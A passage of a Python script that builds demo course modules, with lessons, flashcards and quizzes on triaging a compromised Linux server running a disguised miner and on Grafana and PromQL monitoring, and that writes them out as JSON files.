4. Entry point: `grep Accepted /var/log/auth.log` shows a password login for `deploy` from an IP that was brute-forcing seconds earlier.
5. Persistence: `ls /etc/cron.d/` reveals `sysupdate`, which relaunches the binary every 5 minutes.
6. Contain: capture evidence, then `kill 4242`, `rm /etc/cron.d/sysupdate`, `rm -rf /tmp/.x`, block the IP.

## The 20% you will use constantly
| Question | Command |
|---|---|
| What is hot? | `top`, `ps aux --sort=-%cpu` |
| What is it really? | `ls -l /proc/PID/exe`, `lsof -p PID` |
| Who is it talking to? | `ss -tnp` / `netstat -tnp` |
| How did they get in? | `grep -E 'Accepted|Failed' /var/log/auth.log`, `last` |
| How does it come back? | `/etc/cron.d/`, `crontab -l`, `systemctl list-unit-files` |

## How it breaks
- **Killed the miner, it is back 5 minutes later.** Cause: cron persistence left in place. Fix: remove the cron entry *and* the payload. (See serverfault: "Unknown process using 100% CPU keeps coming back".)
- **`crontab -l` shows nothing, so I assumed no cron.** Cause: system-wide jobs live in `/etc/cron.d/` and `/etc/crontab`, not the user crontab.
- **Rebooted to "fix" it.** Cause: you destroyed in-memory evidence and the persistence survives reboots anyway.

## Don't confuse it with
A **legit kernel worker** (`[kworker/3:2]`) has no executable on disk and runs as a kernel thread. A **disguised process** has a real path in `/proc/PID/exe`.

## Cheat sheet
- Triage: `top` → `/proc/PID/exe` → `ss -tnp` → logs
- Contain: evidence → kill → remove persistence + payload → block → rotate credentials
- After a root compromise: rebuild from a clean image
"""

M2_LESSON = """## Why this matters
Without metrics you find out about outages from customers. With the right queries and one good alert, you find out first.

## The mental model
```
app /metrics ──scrape──► Prometheus (stores time series) ◄──PromQL── Grafana (panels, alerts)
```
Grafana stores no metrics. It asks a **data source** with a **query** and draws the answer.

## Worked example
1. *Connections → Data sources → Prometheus*, URL `http://prometheus:9090`.
   > Pause and predict: why would `http://localhost:9090` fail when Grafana runs in a container?
2. *Explore*: `http_requests_total` is a **counter** (it only goes up). `rate(http_requests_total[5m])` gives requests/second; `sum(...)` adds the series up.
3. Error ratio: `sum(rate(http_requests_total{status=~"5.."}[5m])) / sum(rate(http_requests_total[5m]))`.
4. Latency p95: `histogram_quantile(0.95, sum by (le, route) (rate(http_request_duration_seconds_bucket[5m])))`.
5. *Alerting → New alert rule*: the error ratio, `IS ABOVE 0.05`, pending period `5m`.

## The 20% you will use constantly
| Need | PromQL |
|---|---|
| Is it up? | `up` |
| Throughput | `sum(rate(http_requests_total[5m]))` |
| Per label | `sum by (route) (rate(...[5m]))` |
| Error ratio | `errors / total` (both as rates) |
| Percentile | `histogram_quantile(0.95, sum by (le) (rate(..._bucket[5m])))` |
| CPU busy % | `100 - avg by (instance) (rate(node_cpu_seconds_total{mode="idle"}[5m])) * 100` |

## How it breaks
- **"connection refused" on the data source**: localhost inside a container is the container itself. Use the service name.
- **Graph only goes up**: you plotted a raw counter. Wrap it in `rate()`.
- **"expected type range vector"**: `rate()` needs a range like `[5m]`.
- **Alert flaps all night**: pending period of 0s. Use `for: 5m`.

## Don't confuse it with
`rate()` (per-second average over the window, for graphs and alerts) vs `increase()` (total growth over the window, for "how many in the last hour").

## Cheat sheet
- Counters: always `rate(x[5m])`, then aggregate
- Alerts: symptoms (errors, latency) + pending period + severity label
"""


def modules():
    q = lambda id, kind, prompt, options, correct, accept, explanation, skill: {
        "id": id, "kind": kind, "prompt": prompt, "options": options, "correct": correct,
        "accept": accept, "explanation": explanation, "skill_id": skill}
    m1 = {
        "id": "m1", "title": "Triage a compromised Linux server", "lesson": M1_LESSON,
        "key_points": [
            "Triage order: symptom → process → entry point → persistence",
            "/proc/PID/exe reveals the real binary behind any process name",
            "System cron jobs live in /etc/cron.d and /etc/crontab",
            "Contain only after you know the persistence, and capture evidence first",
            "After a root compromise, rebuild the host",
        ],
        "cards": [
            {"skill_id": "triage", "front": "Which file shows the real executable of PID 4242?", "back": "/proc/4242/exe (ls -l /proc/4242/exe)"},
            {"skill_id": "triage", "front": "Command to list TCP connections with owning processes?", "back": "ss -tnp (or netstat -tnp)"},
            {"skill_id": "log_analysis", "front": "Where does Ubuntu log SSH logins?", "back": "/var/log/auth.log"},
            {"skill_id": "log_analysis", "front": "How do you spot a brute force in auth.log?", "back": "Many 'Failed password' lines from one IP, often for many usernames"},
            {"skill_id": "containment", "front": "Why remove persistence before celebrating a kill?", "back": "Cron/systemd will relaunch the payload within minutes"},
            {"skill_id": "containment", "front": "Where do system-wide cron jobs live besides crontab -l?", "back": "/etc/cron.d/ and /etc/crontab"},
        ],
        "quiz": [
            q("m1q1", "single", "A process named `kworkerds` uses 390% CPU and runs from /tmp/.x. What is it most likely?",
              ["A kernel worker thread", "Malware disguised as a kernel worker", "A stuck log rotation", "Normal under load"], [1], [],
              "Kernel threads show in [brackets] and have no executable on disk.", "triage"),
            q("m1q2", "text", "Which file would you `ls -l` to see the executable behind PID 777?", [], [], [r"/proc/777/exe"],
              "/proc/<pid>/exe is a symlink to the real binary, even if it was renamed or deleted.", "triage"),
            q("m1q3", "multi", "Which of these are persistence mechanisms to check? (select all)",
              ["/etc/cron.d/", "systemd unit files", "/var/log/auth.log", "~/.bashrc"], [0, 1, 3], [],
              "auth.log is evidence, not persistence; the rest can relaunch code.", "containment"),
            q("m1q4", "single", "You killed the miner and it came back 5 minutes later. Why?",
              ["The kernel restarts killed processes", "A cron job relaunches it", "kill only pauses processes", "The load balancer restarted it"], [1], [],
              "A */5 cron entry relaunches it. Remove it and the payload.", "containment"),
            q("m1q5", "single", "What should happen to a host after a confirmed root compromise?",
              ["Reboot it", "Delete the malware and move on", "Rebuild it from a clean image", "Change its hostname"], [2], [],
              "With root, the attacker could have hidden anything; only a rebuild restores trust.", "containment"),
        ],
    }
    m2 = {
        "id": "m2", "title": "Monitoring with Grafana and PromQL", "lesson": M2_LESSON,
        "key_points": [
            "Grafana queries data sources; it stores no metrics",
            "Counters need rate(x[5m]) before they mean anything",
            "Error ratio = rate of 5xx ÷ rate of all requests",
            "histogram_quantile over _bucket rates gives percentiles",
            "Alerts: symptoms + pending period",
        ],
        "cards": [
            {"skill_id": "promql", "front": "Turn the counter http_requests_total into requests per second", "back": "rate(http_requests_total[5m]) (sum(...) to aggregate)"},
            {"skill_id": "promql", "front": "PromQL for p95 latency from a histogram", "back": "histogram_quantile(0.95, sum by (le) (rate(x_bucket[5m])))"},
            {"skill_id": "dashboards", "front": "Why does http://localhost:9090 fail as a data source in containers?", "back": "localhost is the Grafana container itself; use the service name"},
            {"skill_id": "alerting", "front": "What does an alert's pending period (for) prevent?", "back": "Paging on brief spikes; it must stay true for the whole period"},
            {"skill_id": "triage", "front": "First command when a host's CPU alert fires?", "back": "top / ps aux --sort=-%cpu"},
        ],
        "quiz": [
            q("m2q1", "single", "Your panel of http_requests_total only ever goes up. Fix?",
              ["Use increase() with no range", "Wrap it in rate(...[5m])", "Switch to a bar chart", "Set min to 0"], [1], [],
              "Counters are cumulative; rate() gives per-second change.", "promql"),
            q("m2q2", "text", "Write the PromQL function that turns histogram buckets into a percentile.", [], [], [r"histogram_quantile"],
              "histogram_quantile(φ, sum by (le) (rate(..._bucket[5m])))", "promql"),
            q("m2q3", "single", "Best alert for an online shop's checkout?",
              ["CPU > 80% for 0s", "5xx ratio > 5% for 5m", "Any error log line", "Disk > 50%"], [1], [],
              "Alert on symptoms users feel, sustained over a pending period.", "alerting"),
            q("m2q4", "single", "Error: 'expected type range vector in call to function rate'. Why?",
              ["Wrong metric name", "Missing [5m] range", "Grafana is offline", "Label typo"], [1], [],
              "rate() needs a range vector like metric[5m].", "promql"),
            q("m2q5", "single", "(Mixed) Which command reveals who a suspicious process is talking to?",
              ["ss -tnp", "df -h", "uptime", "free -m"], [0], [], "ss -tnp shows TCP sockets with PIDs.", "triage"),
        ],
    }
    return [m1, m2]


def main():
    os.makedirs(os.path.join(OUT, "sims"), exist_ok=True)
    os.makedirs(os.path.join(OUT, "modules"), exist_ok=True)
    for sim in (infected_sim(), grafana_sim()):
        with open(os.path.join(OUT, "sims", sim["id"] + ".json"), "w") as f:
            json.dump(sim, f, indent=1, ensure_ascii=False)
    for m in modules():
        with open(os.path.join(OUT, "modules", m["id"] + ".json"), "w") as f:
            json.dump(m, f, indent=1, ensure_ascii=False)
    with open(os.path.join(OUT, "course.json"), "w") as f:
        json.dump(course(), f, indent=1, ensure_ascii=False)
    print("demo written to", os.path.normpath(OUT))


if __name__ == "__main__":
    main()
